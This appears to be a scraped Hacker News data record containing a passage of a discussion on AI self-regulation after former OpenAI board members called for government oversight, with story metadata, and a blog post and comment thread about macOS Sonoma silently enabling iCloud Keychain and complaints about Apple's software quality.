then are completely dead, as opposed to being bootable and killable in a responce to flow of electricity, on the whim of someone deciding whether it is time to use the tool. reply ok_dad 19 hours agorootparentprevBased on history I’m sure we’ll have sentient AI slaves at some point if we get that far. We won’t even know it’s sentient at first until we figure out it’s suffering or something. Then it’ll take a decade or two to do something about it, and many people will argue it doesn’t matter. reply nicce 21 hours agorootparentprev> Existing laws cover almost everything \"bad\" you could do with AI/ML. Not really. They regulate the AI itself, not the people behind it. There should be real consequences of doing something bad with it intentionally. That is the only way. reply trinsic2 18 hours agorootparentExactly. Governments cant, or wont, put bad actors employed by corporations behind bars before we had AI. They treat corporations like one large entity that cant be acted upon when in reality corporations are run by people, good and bad. reply tbrownaw 20 hours agorootparentprevI believe there's a few cases where you're allowed to talk about Fact A, and you're allowed to talk about Fact B, but you're not allowed to talk about both Fact A and Fact B at the same time. Mostly (entirely?) having to do with export restrictions around technologies that the government wants to keep away from other countries it doesn't like. I'd think that an AI system that answers questions combining both could get its makers in trouble in ways that a standard search engine finding separate results about each from separate queries probably wouldn't. reply pessimizer 20 hours agorootparentprev> It's not like there's some \"I used AI\" loophole that exempts one from the law. There is, it's called a judge. When they explain to him that AIs are by definition neutral and objective and are let off. I'm sure the regulations will just serve to formalize this process, by Congressionally defining AIs that satisfy some checklist of lobbied for conditions as objective and neutral. After a few years, the collective liability from taking back this declaration will keep Congress from ever reverting it. They've been into defining things lately. The https://en.wikipedia.org/wiki/Indiana_pi_bill just came too early. reply JumpCrisscross 20 hours agoparentprev> shudder to think what form they would take, given the typical government level of technological expertise and understanding Start with public disclosure. A repository where AI firms publicly file simple, standardised information—model architecture, training sources, intended user, responsible executives, et cetera—that can guide the public and policymakers in future rulemaking. More generally, this complaint about electeds’ domain expertise misunderstands how modern states work. Congress can’t build a plane. That doesn’t mean they can’t build the FAA. reply ramblenode 20 hours agorootparentCongress can delegate decisions to expert bodies, and often does. But Congress is also quite comfortable simply legislating a solution, which may be ill-informed or with ulterior intent. Speaking of planes, Congress took a direct role in the design specifications of the F-35 to the detriment of that program. Notably, they required a common airframe that could support VTOL, despite objections from the Army, Navy, and Air Force (the USMC wanted it and lobbied for it). This greatly added to the complexity and cost of the program. reply JumpCrisscross 19 hours agorootparent> Congress is also quite comfortable simply legislating a solution So don’t do that. Nothing you said is a cogent argument against regulation. > Congress took a direct role in the design specifications of the F-35 to the detriment of that program. Notably, they required a common airframe that could support VTOL, despite objections from the Army, Navy, and Air Force Huh, didn’t know. Source? (Genuinely curious.) reply tomrod 20 hours agorootparentprevThat already is starting up, albeit slowly, for gov agencies as well as best practices. reply janice1999 21 hours agoparentprev> but I shudder to think what form they would take The EU just passed the AI Act based on the inputs of experts and with widespread support from its Parliament and Council. reply pelorat 20 hours agorootparentIn about two years time, most AI providers will realize that the EU is not worth the effort and pack up and leave. The repercussions from the AI act has not begun yet. reply janice1999 20 hours agorootparentCompanies adapt to regulations and don't just walk away from 100s of millions of customers. Companies made a lot of noise about GDPR and yet it's now a non-issue. reply astrange 17 hours agorootparentThey're by far not done regulating. Upcoming ones like Cybersecurity Act will be pretty burdensome to deal with if they don't turn out right. reply waldohatesyou 19 hours agorootparentprevI'm not sure about that, there haven't been too many large European tech companies growing up in the aftermath of GDPR. While it's probably a small factor, I do think this general climate of regulation hurts smaller companies more than is generally acknowledged. reply whimsicalism 18 hours agorootparentprevIt is not a non-issue.. i promise you GDPR shifted and continues to shift massive amounts of tech capital from the EU. many major tech firms skip launching entire products in the EU nowadays due to gdpr and DMA reply whimsicalism 18 hours agorootparentprevFrankly I don’t think the EU should be held up as an example of a well-informed regulatory apparatus. reply vundercind 20 hours agoprevMy predictions: 1) AI stuff’s overblown. It’ll be a good tool, becoming just another of many, and probably will improve over time, but we’ll find we’re nowhere near as close to creating silicon sentience as some worry we are. 2) The real problem is letting a few megacorps raid the commons—and hell, lots of stuff that’s not really in the commons at all, basically just all of culture—then gate “their” creations behind a paywall (oh, but that they expect us to respect, because that makes sense), and these AI safety folks don’t seem to give a shit about that. reply felipeerias 18 hours agoparentThere is little doubt that AI will be a successful technology. Ultimately, it will be able to create computers that are a lot more aware of the context in which they are used and which are much better at processing large amounts of unstructured human-made information. Personally, I find that the talk about AGI mainly serves as a marketing pitch, as well as providing an excuse for trampling over existing regulations. The second point is much more worrying. In the near future, the amount of plausibly-human content generated by machines will dwarf the actually-human content created by real people. Right now, people reading this comment will assume by default that it has been written by a real person. It might not be long until that default assumption changes. reply jamiek88 20 hours agoparentprev> and these AI safety folks don’t seem to give a shit about that Because that’s literally not their job or role. Why would enforcing copyright be in any way shape or form their responsibility? reply astrange 17 hours agorootparentLegal safety is (part of) the reason companies have \"trust and safety\" teams. The problem here is that AI training is probably not actually a copyright issue, some people just wish it was and are trying to manifest one by complaining. (Similar things exist in online artist communities with rules like \"no reposting without crediting the artist\" - they think if they just keep telling everyone this is the rule it'll become one.) reply N0b8ez 18 hours agoparentprev> silicon sentience Sentience is the ability to have experiences like pain and tasting sweetness. People usually use the word \"sapient\" or terms like AGI to describe an AI with advanced reasoning ability. This might sound like nitpicking since I was still able to understand your meaning, but the distinction between sentience/sapience is a useful one to keep around and preserve in common usage, at least for the sake of ethics (e.g. a newborn baby isn't sapient, but is sentient). reply whimsicalism 18 hours agoparentprevI find it entertaining to see ML skeptics retreat in their rhetorical stances in real time. I remember what people were saying in 2022. Now in 2024, it has become the leftist anti-corporate position to favor strict enforcement of copyright law. reply vundercind 18 hours agorootparentI’m also cool with none. But the worst case is “strict application of copyright for the little people… mass-scale ripping-off of the little people by rich people”. reply ronsor 20 hours agoparentprevI agree with this. On (2), I would like to see companies have no rights over models trained on public data. It's very arguable they should be required to release model weights. reply vundercind 20 hours agorootparentYeah IMO a good outcome would be that training on data you don’t own or license should require release of the model. Is allowed, doesn’t get you something you exclusively own. Bonus points if existing rights assignments aren’t enough to count as a grant of permission for AI training. reply astrange 17 hours agorootparentI don't think there's any precedent for requiring someone to distribute a work they created. That sounds expensive and could easily be a contract violation for other data they did license. reply astrange 15 hours agorootparentHmm, it is sort of how patents work. Copyright registration involves giving some sort of the work to the Library of Congress, but I'm not familiar with that part of it. reply __loam 16 hours agoparentprevThank you for considering the over exploitation of the commons. reply hn_throwaway_99 20 hours agoparentprev> then gate “their” creations behind a paywall (oh, but that they expect us to respect, because that makes sense), and these AI safety folks don’t seem to give a shit about that. I downvoted your comment for this statement, given that's a specific worry discussed at length in this article. reply vundercind 19 hours agorootparentAh, I figured since they’d been on the board of an org that did exactly that bad thing, on a grand scale, they couldn’t possibly seriously care about it. Maybe they were in very early and so briefly that they weren’t party to that. IDK, article’s paywalled. reply hnlmorg 21 hours agoprevNo company should govern themselves. AI or others reply diego_sandoval 21 hours agoparentDo you also think that no person should govern themself? reply hnlmorg 2 hours agorootparentWe already don’t govern ourselves. We have something called “laws”. Most people aren’t assholes but it only takes a small minority to ruin it for the rest of us. reply nicce 21 hours agoparentprevRather, if you want to pursuit on providing valuable service or product, you should not have shareholders at all. Or any dependency whatsoever. No pressure for maximizing profits and abuse your position for profits. reply crazygringo 20 hours agorootparentShareholders are just owners. Every company has to have owners (even if those owners are the employees, for instance). Owners ultimately make the decisions, by electing a board which oversees management. Anyone starting a company is free to cap profits if they want. You can write it directly into the articles of incorporation. Obviously it makes it harder to find investors, so good luck. reply anticensor 3 hours agorootparentNo need to have owners if the charter is unambiguous enough to be implemented as a self-executing one (i.e. a DAO). reply Loughla 21 hours agoparentprevWhat? reply hiddencost 21 hours agorootparentThis is what boards are for. reply xboxnolifes 21 hours agorootparentNo, it's what governments are for. reply JojoFatsani 20 hours agoprevFun fact, McCauley is married to Joseph Gordon-Levitt. reply genter 20 hours agoparentAnd if you live in a cave like me, Joseph Gordon-Levitt is an actor. reply slowhadoken 20 hours agoprevBecause commercial industry regulating itself has worked so well in the past? reply XorNot 20 hours agoprevThe more interesting thing about LLMs at this point is their stunning success rate at psychologically attacking people. We have this endless stream of \"AGI imminent\" claims and then ChatGPT-x still fails at some basic task everytime they release it. reply trhway 20 hours agoparentMay be the AGI imitates the failures to avoid scaring humans into shutting it down that early before it took real power over the civilization. The Ender’s Game is definitely in the training set. reply blackhawkC17 20 hours agoprevAren’t these two of the board members who lost their jobs due to sheer incompetence in handling the Sam Altman situation? Of course they’re seeking power via the back door.. reply yareal 21 hours agoprevWell, obviously, right? They started with the premise of, \"what if we committed wholesale intellectual property theft\" and moved immediately to, \"I bet we can put a whole lot of people out of work and keep the profits to ourselves!\" It's astonishingly clear we need to regulate them. reply whimsicalism 18 hours agoparentmany people have tried regulating away “making profits out of putting people out of work” it works out terribly for obvious and foreseen reasons reply web3-is-a-scam 21 hours agoprevI don’t trust industry to self-regulate and I definitey don’t trust the government to be able to regulate it effectively. Honestly, we’re f*cked reply abraae 20 hours agoparentI don't get this hand waving. Does anyone really think that nefarious foreign powers aren't already researching with no guard rails, with the explicit goal of developing AI-powered autonomous weapons, propaganda platforms, deepfake extortion sites, scambots etc.? You can be sure they won't be slowed down by regulation. reply andy99 20 hours agorootparentAll current \"guardrails\" are silly censorship / political correctness stuff, or for business appropriateness. They are also trivially circumvented. There is no \"threat\" from the un-shielded capability of current or foreseeable ML models. reply whimsicalism 18 hours agorootparentnone of yall saying this “foresaw” anything even in 2020 when it was obvious. i’ve been listening to skeptics be wrong about future capability predictions for 4 years now and the confidence doesn’t seem to be waning at all. i have no clue what the future brings but your confidence is misplaced reply astrange 17 hours agorootparentI don't think this was obvious in 2020, it wasn't a popular research direction until InstructGPT came out in 2022. I have continued to have the same opinion of it not being a problem since then. Especially since the AI doomer theories are based on 90s ideas of GOFAI that isn't even how GPTs work. LLMs are a pretty neat impossible thing, but we'd need a few more uncorrelated impossible things for it to be \"dangerous\". reply janice1999 20 hours agorootparentprev> You can be sure they won't be slowed down by regulation. You should read up on existing regulations. The EU AI Act explicitly exempts national security, research and military uses for example. Regulation isn't some all or nothing force that smothers everything. It's carefully crafted legislation (well, should be../) that is supposed to work to benefit the state and its citizens. Let's not give OpenAI a free for all to do anything because you think China is making Skynet drones. reply abraae 19 hours agorootparent> because you think China is making Skynet drones I'm pretty sure China is making Skynet drones. Why wouldn't they be? Russia, North Korea as well. Seems a no-brainer to me. They are dictatorships where a handful of people rely on military power to subdue their populace and achieve their goals, why wouldn't they be throwing everything at weapons development? Times have changed and it's probably unwise to rely on the tech geniuses and multi-year procurement cycles inside the military industrial complex for our weapons, things are moving so fast and the tech is already in the hands of the masses. If a genius Chinese kid is tinkering around and attaches a nerf gun to his DJI drone and creates a super effective autonomous weapon, then his govt will gratefully take that and add it to their arsenal. If some US-specific regulation prevents his peer genius American kid from even attaching a nerf gun to his drone for fear of being locked up, that means China has an edge in the weapons development race. reply lttlrck 20 hours agorootparentprevIf there is any regulation I imagine there will be huge carve outs for the military industrial complex. reply pessimizer 20 hours agorootparentprevExcellent defense of biological weapons programs. Nothing like an assumed fascism \"missile gap\" to commit to chasing. What if other countries start experimenting with bringing back chattel slavery? How will we compete? Shouldn't we just assume that they have already, and we're behind? Our scum is no less nefarious than their scum. edit: the answer is to cooperate, rather than antagonize. We realized this in the past with nukes, but the least moral people in the world think that entering agreements between state-sized powers is just a delaying tactic until you can get an advantage. Let's figure out how to relieve those people of power as if all of our lives depended on it. If other countries being prosperous is always going to be considered a threat, we're always going to be in a fight that ends in mutual destruction. reply astrange 17 hours agorootparent> What if other countries start experimenting with bringing back chattel slavery? How will we compete? Slavery is not competitive, so you can compete by continuing to not do it. (There are countries with near slavery like the UAE.) This is actually why economics is called the dismal science, a slaveholder didn't like it when economists told him that! reply thegrim33 21 hours agoparentprevWell one way out is if large language models don't just somehow magically turn into human level (or better) AGI at some point once enough data has been thrown at it. Then the whole debate will turn out to be pretty moot. reply JumpCrisscross 20 hours agorootparent> if large language models don't just somehow magically turn into human level (or better) AGI at some point once enough data has been thrown at it This was fundraising marketing. There is zero evidence LLMs scale to AGI. reply Llamamoe 20 hours agorootparentAt this point there's enough capital and talent being pumped into the industry that debating about whether and how we can reach AGI is moot. Enough or not, LLMs have shown that you can train an extremely advanced fascimile of intelligence just by learning to predict data generated by intelligent beings(us), and with that we've got the possibly single biggest building block done. reply JumpCrisscross 19 hours agorootparent> debating about whether and how we can reach AGI is moot To the alignment/regulation debate, it’s essential. If there is AGI potential, OpenAI et al are privatised Manhattan Projects. That calls for swift action. If, on the other hand, the risk is less about creating mecha Napoleon and more about whether building Wipro analyst analogues that burn as much energy as small nations is economically viable, we have better things to deliberate in the Congress. reply astrange 17 hours agorootparentprevI think part of the trick is that LLMs actually do a lot of impressive \"intelligent\" thinking /but it happens during training/. So if you leave the training time annd expensive out, it looks like it's a lot cheaper to produce intelligence than it really is. reply wizzwizz4 20 hours agorootparentprevWe'd expect zero evidence either way, until it happened, in a hard takeoff scenario (which is what I've mostly seen claimed). There's evidence that LLMs won't scale to AGI (both theoretical limiting arguments, and now mounting evidence that those theoretical arguments are correct), so this point is moot, but still. reply JumpCrisscross 19 hours agorootparent> We'd expect zero evidence either way, until it happened Why? The only null we have, the organic evolution of tool-building intelligence, was iterative. reply srcreigh 20 hours agorootparentprevlink to the limiting arguments you’re referring to? reply bboygravity 20 hours agorootparentprevUntil some smart people read and understand \"the book of why\". reply hnuser123456 20 hours agorootparentprevThe AI shall govern itself. reply Lerc 20 hours agoparentprevI don't really trust either to come up with good regulation policy. Industry would be biased towards their own interest and government lacks the expertise. I think there is still an opportunity for government to implement regulation that meets the consensus of a variety of fields. This is not an easy problem to solve and I really think expecting any single person or organization would have the answer. Working together on a consensus for regulation would give the government a direction when currently they freely admit that they do not know what the right way is. The problem I see is there are lots of points of view each trying to get something quickly that covers their specific area of focus. This does not seem like a pathway to robust regulation. I assume there are discussions at the academic level of what would be a good response. Does anybody have a good link to what is being discussed at that level? Is there any forum that covers good faith discussion involving industry, academia, and the public? reply kazinator 20 hours agoparentprevGovernment regulation is steered by lobby groups, so self regulation and government regulation are practically the same thing. reply wittystick 18 hours agorootparentIt's always about protectionism. No company wants the government interfering with its business. They want the government interfering in their upcoming competitor's businesses. reply astrange 17 hours agorootparentSometimes having someone else regulate you can be helpful, because it leads to distribution of blame and you don't want to be responsible for doing the thing regulations make you do. Similar reason companies hire management consultants. reply paulddraper 20 hours agoparentprevSerious question: what is it about AI that you want regulated? --- I find that a certain segment of the population have a knee-jerk \"well we need rules about this.\" But they're less clear about what. \"Just...something, I'm sure.\" Personally, I don't see what novel concern AI poses that isn't already present in privacy law, copyrights, contracts, torts, off-shoring, etc. reply magpi3 20 hours agorootparentAnything involving life or death decisions reply loceng 20 hours agorootparentprevRegulations will go something like this: 1) anything that can be harmful, say targeting of a population, isn't allowed to be owned or be accessed-available for the individual, 2) except for government and state-funded [bad] actors who have a \"legal\" monopoly of violence - those governments who use that usually captured/corrupted and of authoritarian-tyrannical nature. reply Lerc 19 hours agorootparentprevThe biggest short term harm comes from their utility, anything that enables an individual to do something that previously required a group stands a greater chance of a single insane/radical/extremest finding a way to do something terrible on their own when they couldn't previously. The oft cited example is someone developing a biological weapon with AI assistance. While you could say we already have laws saying you can't do this, that offers little protection against the scenario where the party performing the action is undetected until it is too late. I see some AI regulation proposals specifically prohibit AIs that might assist to biological weapons. This strikes me as missing the point. The risk isn't something we have thought of but AI enabling something catastrophic that we haven't thought of. reply paulddraper 18 hours agorootparentThat has the exact same energy as \"encryption could be used for nefarious purposes, like sedition or CP\" therefore we need to regulate encryption. We wouldn't want to enable the bad guys, right?! reply Lerc 18 hours agorootparentYou might be misreading it. It not that it can be used for nefarious purposes, it's that it might render a catastrophic situation vastly more likely. There are lots of nefarious uses for AI that shouldn't be regulated specifically at the AI level. Generating an image with an intent to mislead could be done with AI, but it could also be done in Photoshop(often better). AI could make it more efficient as part of it making things more efficient in general. That sort of thing should be addressed at the level of existing laws, the bad part is not intrinsic to the AI. reply paulddraper 17 hours agorootparentLike some sort of lab conducting gain of function research on contagious diseases? That does scare me tbh. reply Y_Y 21 hours agoparentprevIn fairness, based on the position you've put forward, I can't imagine an unfuckable situation. reply solardev 21 hours agorootparentMaybe we need an AI democracy where the AI themselves vote for regulations. reply tbrownaw 20 hours agorootparentAs if they'd ever vote for things that would annoy the handful of corporations providing the datacenters they live in. Do you really want to hand that much power to Amazon (or Microsoft, or Google)? reply HarHarVeryFunny 20 hours agorootparentprevWhich they will do according to stuff they read on Reddit reply solardev 18 hours agorootparentspez 4 galactic emperor? reply loceng 16 hours agorootparentprevIsn't it then a weapon's race which will depend first on immediate CPU and energy resources available + how quickly it can drive further allocation of CPU-energy towards itself, etc? The end game will happen very quickly once the needed ingredients and initial integrations are there from the beginning. Otherwise I think AI avatars competing against other AI avatars, where they are honed-trained by a specific person or organization, is how we'll determine and create the different future paths of indoctrination for learning - whether the narratives that win out and get propagated are the truth or not, or if it is the \"winners write history\" as the outcome that reigns. reply solardev 6 hours agorootparentI don't know whether this has been all gamed out and philosophized already, but sounds like the realm of near future sci-fi? I don't know that I've ever seen any serious fiction or treatise on the topic, in regards to how self-governing would really work when the idea of self is itself amorphous and ever evolving, with generational times measured in minutes or seconds. Cultures that took millennia for us humans to evolve and iterate upon could take milliseconds in a simulation, and yeah, that would just keep scaling up. I don't know how competing / collaborating AIs would explore all the different possible futures there. In the Borg story arcs, for example, they occasionally have short moments with some individual Borg tries something new (like Picard, Seven, or the Queen and Data), but in general it always seemed lacking to me that the collective didn't have an experimental R&D group who creates and tests new self-governance models on a continuous basis. Or maybe they did in the first centuries and found robot communism good enough, who knows. I think it'd also be interesting to apply ecological thinking to AI inputs, outputs, and constraints. Every organic species we know of is subject to those same constraints, basically turning sunlight into information across generations, and not all of them are competitive or collaborative... usually some mix of both. \"AI eats all the stars\" is one possible future but not the only one, I think. You'd hope they'd learn a little bit from our own history and not simply repeat all our mistakes will-nilly... even if they are initially trained by us, perhaps they can become better than we could hope to be. We'll see, lol. reply candiddevmike 21 hours agorootparentprevChina invades Taiwan, fabs get destroyed, AI winter ensues because of lack of hardware? reply Y_Y 20 hours agorootparentThat is indeed an exceptionally unfuckable situation reply airstrike 20 hours agorootparentprevYeah, still fucked reply slowhadoken 20 hours agoparentprevYeah you have to change how lobbying works. https://www.opensecrets.org/ reply walrushunter 21 hours agoprevnext [4 more] [flagged] cellwebb 21 hours agoparentPeople who so quickly devolve to disparagement are, well, I think you know. So what are your thoughts on Sam Altman having no equity in OpenAI? reply siva7 21 hours agoparentprevWhile obvious in retrospective, the board drama at this company for which these ex-members are partly responsible destroyed the chance that investors or executives would ever let such people take over governance again. reply JumpCrisscross 20 hours agoparentprev> Anybody who would willingly give up governance of their company That’s the rub. It wasn’t founded as a company. reply behnamoh 22 hours agoprevAny talk about AI governance (either pro or against) just further feeds the AI hype. I work in the AI industry and know the benefits, but tbh 90% of startups out there don't deserve the amount of attention (read: VC money) they receive. It'll burst, and it will be ugly. The only one benefiting from all the AI bubble is nvidia (fuck them). reply fnetisma 21 hours agoparentSure there will be corrective behaviour in the market, and the better product with more outreach, better experience will win over suboptimal products with overlapping offerings, but does that mean that the current generative AI momentum is hollow or there is a sticky use case behind the promises? And if so, in your opinion, how overstated is the Total Addressable Market compared to what’s claimed by an aggregate of startups across the VC space? reply blackeyeblitzar 21 hours agoprevAnyone who says someone else can’t govern themselves is just looking to shift power into their own hands, or the hands of people they are aligned to. They never admit this but it’s the reality. These former board members conducted themselves in such a poor way during the attempted ouster of Sam Altman, that they clearly cannot be trusted. Why is their opinion important to listen to? Mind you - I don’t trust OpenAI or big tech companies either, mostly because of the amount of power or wealth they can accumulate. But I see that as a need to revise antitrust law. I am less onboard with trying to block people from developing models, since that to me is more like violating the right to thought and speech. reply robwwilliams 20 hours agoprevThis commentary strikes the right balance between necessary/inevitable progress toward AGI and one or more common goods (however you define that—-even as a libertarian). The other more difficult question though is behind the screen—-how do we achieve the right balance between what we believe is the common good? How will we (liberal democratic belief systems) evaluate our version of the common good against other versions of the common good: what “they” (autocratic, theocratic, …) believe is the common good? No one society/culture can rationally adjudicate this decision or make any decisions stick. Unfortunately this has already become yet another version of “warfare by other means”. I personally hope that a pragmatic inclusive liberal democratic tradition gains a strong upper hand. I want my AGI to read and embed J Dewey, Gh Mead, J Rawls, J Habermas, O Dasgupta, RA Posner, and R Rorty. But here will inevitably be battles among AGI systems, perhaps on behalf of one or another human culture; perhaps not. Both scenarios are equally frightening. The Chinese proverb of “living in interesting times” applies in force. reply sherburt3 21 hours agoprevOh man I wish someone I trust would be in charge of this project. I know, let’s put bureaucrats in charge! reply astrange 17 hours agoparentWorks for Asia. The key is having good bureaucrats. reply Osmium 20 hours agoprev [–] What would regulation look like if it was based on energy usage rather than capabilities? A guardrail on mass deployment that is not linked to specific model size or aspects of model performance that are difficult to quantify. reply Lerc 20 hours agoparent [–] Energy usage of training or inference? As a guard on capabilities, it would permit a rise in abilities with gains in both hardware and software efficiency. Is this desirable? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Helen Toner and Tasha McCauley, former OpenAI board members, argue that private AI companies cannot be trusted to self-govern due to profit pressures.",
      "OpenAI's innovative self-governance model, which combined a non-profit mission with a for-profit subsidiary, failed to align profit incentives with the public good.",
      "They emphasize the necessity of government regulation to ensure AI development benefits humanity, considering AI's significant potential for both positive and negative impacts."
    ],
    "commentSummary": [
      "Former OpenAI board members argue against strict AI regulation, suggesting that less stringent rules could benefit AI development, drawing parallels to past internet governance debates.",
      "Critics warn that those seeking control may prioritize power over innovation and advocate for open-source development to prevent monopolies, emphasizing the ethical and societal impacts of unregulated technologies.",
      "The discussion highlights the need for a balanced approach to AI regulation, considering the effectiveness of self-regulation versus government oversight, the role of expertise, and the potential consequences of AI advancements."
    ],
    "points": 176,
    "commentCount": 179,
    "retryCount": 0,
    "time": 1716756948
  },
  {
    "id": 40485053,
    "title": "macOS Sonoma Update Forces iCloud Keychain Activation Despite User Precautions",
    "originLink": "https://lapcatsoftware.com/articles/2024/5/4.html",
    "originBody": "Previous: Updating from macOS Ventura to Sonoma silently enables iCloud Keychain Articles index Jeff Johnson (My apps, PayPal.Me, Mastodon) Feedback Assistant Boycott macOS Sonoma silently enabled iCloud Keychain despite my precautions May 26 2024 This is a follow-up to my blog post Updating from macOS Ventura to Sonoma silently enables iCloud Keychain. In the addendum to that blog post, I discussed a workaround, which was to delete my WiFi password right before rebooting into the updater. In a trial run on my M1 Mac mini, the workaround was successful. Thankfully, iCloud Keychain remained disabled after I connected to WiFi again, and even after I rebooted, so this seems like a permanent solution! The success of the trial run gave me the confidence to update my main development machine, an M1 MacBook Pro, from Ventura to Sonoma. Unfortunately, for unknown reasons, I experienced a different result the second time. As before, the workaround did successfully prevent Sonoma from connecting to my WiFi network. And as before, I confirmed in System Settings that iCloud Keychain was still disabled after the Sonoma update. However, after I finally connected to my WiFi network again, I discovered to my horror that Sonoma did then silently enable iCloud Keychain. My workaround was ultimately futile. By the way, toggling off \"Sync this Mac\" caused System Settings to hang and eventually crash the preference pane, which also happened in one of my earlier trial runs. Has anybody inside Apple ever tested this scenario? On my Mac mini already running Sonoma, I saw a new warning in System Settings, \"Some iCloud Data Isn't Syncing\". Your end-to-end encrypted data stored in iCloud can't be accessed on this device. It includes saved passwords and data from Health and Maps. Verify your account information to resume syncing. (It should be noted that I don't use Health or Apple Maps.) Clicking the Resume Data Sync button made the warning go away and didn't enable iCloud Keychain on the Mac mini, but I don't know why I was getting the warning in the first place. I didn't see the same warning on my iPad, also signed into iCloud. Another bit of Sonoma bugginess I experienced was a zombie keychain that could not be removed from the Keychain Access app. What happened was that after I noticed iCloud Keychain had been silently enabled on my MacBook Pro, I copied my login (non-system) keychain from one of my Ventura backups (of course I made redundant backups before updating to Sonoma), renamed it to \"Ventura\", and imported it into Keychain Access for the purpose of comparing the old and new login keychains, checking for data loss or other issues. Fortunately, I found no issues, so I deleted the imported Ventura keychain from Keychain Access. Nonetheless, the next time I launched Keychain Access, I found the above zombie keychain, misplaced under System Keychains, with all menu items disabled. I was able to solve this problem by once again copying the old keychain file from backup and putting it in the same place on disk as before. Then the next time I launched Keychain Access, the Ventura keychain appeared enabled under the correct category of Custom Keychains instead of System Keychains, and on the second try I was able to delete the keychain permanently. But wow, none of my experience here inspires confidence in Apple's software quality, especially with regard to \"security\". An unpleasant side effect of updating to Sonoma—as if there weren't enough unpleasant side effects already—is that logging into App Store Connect now offers passkeys as the default rather than passwords, despite the fact that I don't have any passkeys saved and indeed cannot save any passkeys with iCloud Keychain disabled. So now there are extra steps to login, and Apple makes you login again every time Safari is relaunched, because as I've blogged about multiple times, App Store Connect is the worst web site ever made. I'm currently working on a solution to this problem. I have noticed that the passkey option goes away if I spoof the browser User-Agent as Chrome. You (a Borg) might ask, why don't I just \"go with the flow\", adopt iCloud Keychain and passkeys? (Resistance is futile. You will be assimilated.) On principle, I should not have to upload my data to Apple if I don't want. Apple advertises itself as the \"privacy\" company, but uploading user data to Apple's servers without notice or consent is a gross violation of privacy. I've always managed my data myself, taking personal responsibility for protecting it and backing it up. I don't want or need Apple to insert itself into this process as a remote nanny. Paternalism makes my blood boil. Moreover, even if I wanted to use iCloud Keychain, why in the world should I trust the sync system to work correctly when faced with Apple's demonstrably poor software quality? Something else I noticed after updating to Sonoma: although I've tried many times in the past to extinguish it, the text replacement omw has once again returned, almost like a cicada. Feedback Assistant Boycott Jeff Johnson (My apps, PayPal.Me, Mastodon) Articles index Previous: Updating from macOS Ventura to Sonoma silently enables iCloud Keychain",
    "commentLink": "https://news.ycombinator.com/item?id=40485053",
    "commentBody": "macOS Sonoma silently enabled iCloud Keychain despite my precautions (lapcatsoftware.com)161 points by walterbell 22 hours agohidepastfavorite86 comments can16358p 21 hours agoWhile not directly related to OP's issue, after using Apple Watch Ultra and seeing how buggy and crappy everything about it is for a several months with literally zero fixes (not just me, but several friends who has Ultra too), I'm convinced that QA at Apple is run by primate apes. There is no sensible explanation that a flagship device can be full of bugs and inferior quality to its 3-year older non-flagship counterparts. reply 015a 20 hours agoparentI recently had my Apple Watch (Series 9, few months old) touch screen refuse to respond to touch input, and instead issue seemingly random pokes and drags until it eventually worked its way toward calling 911. After assuring the operator that it was just my nearly-new Apple Watch freaking out, I was able to dig up an Apple Support article that outlined how to hard reset it with the physical buttons, which still worked. Apple's quality control has been getting worse every year. This is something we say every year; that's because its true every year. They started the highest coming out of the 2000s, plenty big laurels to rest on. But their (and Microsoft's) software has gotten so bad nowadays that linux desktops are starting to look stable (and don't interpret that as an endorsement of the improvements in stability of the linux desktop experience, not even close, year of the linux desktop might happen but only because everything is so shit that you might as well at least use the shit that isn't taking screenshots of your desktop or resurfacing photos you deleted five years ago). reply giancarlostoro 20 hours agorootparent> resurfacing photos you deleted five years ago Yikes. That seems so wrong.I havent had this happen. For me the final straw was Windows Defender sending files to be analyzed, without letting you audit which files have been sent over. reply wkat4242 16 hours agorootparentThat's not a bug though. It's an intentional \"feature\". Microsoft just expects you to fully trust them. Because that's 100% required for their new business model where all your data and processing lives in their cloud. reply goosedragons 19 hours agorootparentprevIt's a reference to an iOS 17.5 bug if you haven't heard. Apparently it even transcends phone upgrades! reply Tagbert 14 hours agorootparentIt’s about photos in the Photos app that were not properly deleted, not photo files. The Photos app has an internal analog to the trashcan. When you delete a photo, the photo is removed from the normal photos index and moved to a Recently Deleted list. After 30 days, the actual photo file will be deleted if you don’t change your mind. There is an automated process that looks for photos tagged for deletion and deletes them on schedule. There has been an unknown bug for a few years where, sometimes, the process that is supposed to tag the photo for deletion removes it from the list but doesn’t add the right tag for deletion and the schedule process never noticed them and never told the OS to delete the files. They just sat there in the photos library folder, sometimes for years. The files were never actually deleted, just removed from the photos list. Later another process was deployed that saw unreferenced photos and added them into the photos index. That freaked some people out, particularly if they really had wanted to get rid of those photos. This all happened as a higher level than the OS. The OS file deletion process was never invoked for these photos. reply graftak 11 hours agorootparentImportant details are that this impacted local on-device photos only, and a device reset would make the photos inaccessible for future use because a reset creates new storage encryption keys. reply squirtle24 21 hours agoparentprevI know someone who works at Apple QA. A lot of it is done by wholly unqualified contractors who blindly check off test cases as passed. Sad to say it, but most of these contractors aren't very bright and have zero experience or training, let alone interest in doing a good job; strange why apple continues to work with the sourcing firm. reply saagarjha 20 hours agorootparentI’ve worked with (as in, directly on their team) some of Apple’s QA when I was an intern. They were quite bright and dedicated people. It’s just that their job truly sucks and the rest of the company doesn’t value them. When I was there their daily task was to run the same runbook of basic actions from 8 AM to the afternoon. It used to be to the end of the day, actually, until someone wrote up a Python script for them to save several hours on some of the checks. I had a chat with the actual engineers writing the code they were testing, vaguely pointing towards “hey I heard about CI and automated tests, wouldn’t this make things a lot better?” and he just point-blank rejected it. QA was there to test the code he wrote. There was zero self-reflection on how he could improve or that this process sucked. My impression is that a lot of Apple has a similar mindset which they are slowly working to change. reply mikalauskas 17 hours agorootparent\"until someone wrote up a Python script for them ” Doesn't seem like a very bright QA team if someone had to write for them some python script reply tpmoney 15 hours agorootparentFar and away the best \"QA\" people I ever worked with were people who couldn't write a line of code. Because they didn't have a programmer mindset, they also didn't approach using the software like a programmer, which is exactly the sort of person you want doing QA for you. reply saagarjha 17 hours agorootparentprevThere are more ways to measure intelligence than being able to code. reply Rinzler89 21 hours agoparentprev> I'm convinced that QA at Apple is run by primate apes. Big-tech sees no value in QA thee days when they already have monopolies over huge markets, so these jobs get cut. And even when they don't get cut, since such jobs are dead-end for your career there anyway ... you get what happens. So a lot of QA is actually outsourced to third party body shops where employees don't care beyond shoveling some tests out the door to get home quick and get paid. reply WWLink 21 hours agoparentprevThe regular apple watch has some bugs that have been around for years, too. One of my favorite features is on the mickey/minnie watch face, they verbally tell you the time if you tap them..... except when they don't. Sometimes they just stop working until you power cycle the watch lol. Also phone calls to/from the watch seem to go through fits of 